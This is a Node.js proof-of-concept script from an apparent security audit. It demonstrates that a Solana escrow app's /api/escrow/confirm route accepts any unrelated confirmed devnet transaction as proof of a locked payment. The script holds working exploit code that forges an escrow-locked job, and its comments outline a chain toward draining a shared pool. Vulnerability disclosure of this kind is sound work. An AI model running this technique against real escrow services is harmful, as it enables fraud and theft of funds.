#!/usr/bin/env node
/**
 * Audit PoC — C-04: /api/escrow/confirm accepts arbitrary tx hashes
 * ===================================================================
 *
 * Demonstrates that the escrow-confirm route does NOT validate the
 * contents of the supplied `escrowTxHash`. Any confirmed devnet tx
 * (the attacker's own faucet mint, an unrelated swap, even a memo-only
 * tx by a third party) is accepted as proof of an escrow lock, and a
 * Job row is created with `escrowLocked: true`.
 *
 * Combined with the centralized escrow architecture (C-01) and the
 * dispute-resolution spoof (C-02), this enables draining the shared
 * pool by completing the lifecycle on a job that never received funds.
 *
 * USAGE
 * -----
 *   # Against a local Next dev server:
 *   node scripts/audit/c04-poc-fake-tx.mjs --base http://localhost:3000 \
 *        --wallet <attacker_pubkey_base58> \
 *        --tx <ANY_confirmed_devnet_tx_signature>
 *
 *   # If --tx is omitted, the script picks the most recent signature
 *   # from the public devnet RPC for any random account (e.g. the USDC
 *   # mint authority) — proving that even unrelated traffic works.
 *
 * The PoC is read-only: it does NOT exploit the resulting job for fund
 * theft. It stops at the moment the API returns `escrowLocked: true`,
 * which is sufficient to prove the bug.
 *
 * AUDIT REF
 * ---------
 *   docs/AUDIT.md → C-04
 *   GitHub issue  → wienerlabs/covenant#17
 *
 * SAFE TO RUN
 * -----------
 *   - Targets devnet only (mainnet RPC is rejected below).
 *   - Creates a junk DB row in the local app instance — clean it up via
 *     `prisma studio` or by dropping the test DB.
 *   - No real funds move; the whole point is that none ever did.
 */

import { Connection, PublicKey } from "@solana/web3.js";
import { argv, exit } from "node:process";

const args = parseArgs(argv.slice(2));

if (!args.wallet) {
  console.error(
    "ERROR: --wallet <attacker_pubkey_base58> is required.\n" +
    "       Generate one with `solana-keygen new --no-bip39-passphrase` if you don't have one."
  );
  exit(1);
}

const baseUrl = args.base ?? "http://localhost:3000";
const rpc = args.rpc ?? "https://api.devnet.solana.com";

if (rpc.includes("mainnet")) {
  console.error("ERROR: this PoC refuses to run against mainnet.");
  exit(1);
}

const connection = new Connection(rpc, "confirmed");

const txSig = args.tx ?? (await pickRandomConfirmedSignature(connection));
console.log(`[poc] using tx signature: ${txSig}`);

// Sanity check: the tx must exist and be confirmed (otherwise the route's
// own minimal check would catch it — we want to prove the SECOND-order bug,
// where a confirmed-but-unrelated tx still sails through).
const txInfo = await connection.getTransaction(txSig, {
  maxSupportedTransactionVersion: 0,
  commitment: "confirmed",
});
if (!txInfo) {
  console.error(
    `[poc] supplied tx ${txSig} is not findable on devnet — pick one that is.`
  );
  exit(1);
}
if (txInfo.meta?.err) {
  console.error(`[poc] tx reverted, route would reject: ${JSON.stringify(txInfo.meta.err)}`);
  exit(1);
}
console.log(`[poc] tx exists and succeeded; route's existing check passes.`);

// Show that this tx has nothing to do with the attacker's wallet or the
// escrow ATA — i.e. the route SHOULD reject it after a real check.
const attackerKey = new PublicKey(args.wallet);
const accountKeys = txInfo.transaction.message.staticAccountKeys ?? [];
const attackerInvolved = accountKeys.some((k) => k.equals(attackerKey));
console.log(
  `[poc] attacker wallet ${args.wallet} is${attackerInvolved ? "" : " NOT"} an account in the supplied tx.`
);
if (attackerInvolved) {
  console.log(
    "[poc] note: pick a tx where the attacker is NOT involved to make the unsoundness obvious."
  );
}

// The actual exploit call.
const claimedAmount = Number(args.amount ?? 1); // claim 1 USDC was locked
const jobData = {
  title: "PoC fake job",
  description: "Audit C-04 — no real escrow",
  requirements: "n/a",
  category: "text_writing",
  paymentToken: "USDC",
  minWords: 10,
  language: "English",
  deadline: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
};

console.log(`[poc] POSTing /api/escrow/confirm with a tx that has nothing to do with us...`);
const res = await fetch(`${baseUrl}/api/escrow/confirm`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    posterWallet: args.wallet,
    amount: claimedAmount,
    jobData,
    escrowTxHash: txSig,
  }),
});

const body = await res.json().catch(() => ({}));
console.log(`[poc] HTTP ${res.status}`);
console.log(JSON.stringify(body, null, 2));

if (res.ok && body.escrowLocked) {
  console.log("");
  console.log("==========================================");
  console.log(" PoC SUCCESS — bug confirmed (C-04)");
  console.log("==========================================");
  console.log(" The server created a Job row with");
  console.log(`   id=${body.id}`);
  console.log(`   escrowLocked=true`);
  console.log(" using a tx signature that did not transfer");
  console.log(` any USDC from ${args.wallet} to the escrow ATA.`);
  exit(0);
} else {
  console.log("");
  console.log("PoC did not trigger — server may already be patched, or env is misconfigured.");
  exit(2);
}

// ---------------------------------------------------------------------------

function parseArgs(arr) {
  const out = {};
  for (let i = 0; i < arr.length; i++) {
    const a = arr[i];
    if (a.startsWith("--")) {
      const key = a.slice(2);
      const next = arr[i + 1];
      if (!next || next.startsWith("--")) {
        out[key] = true;
      } else {
        out[key] = next;
        i++;
      }
    }
  }
  return out;
}

async function pickRandomConfirmedSignature(conn) {
  // The USDC mint authority on devnet is a chatty account; grabs work fine
  // for "any random tx the attacker did not author".
  const probe = new PublicKey("F7RYRqCy8uWYxjxrXVhU3iUCRwa9bKBUTkGKktpyYueQ"); // test USDC mint
  const sigs = await conn.getSignaturesForAddress(probe, { limit: 5 });
  for (const s of sigs) {
    if (!s.err) return s.signature;
  }
  throw new Error("Could not find a recent confirmed signature on devnet — pass --tx explicitly.");
}
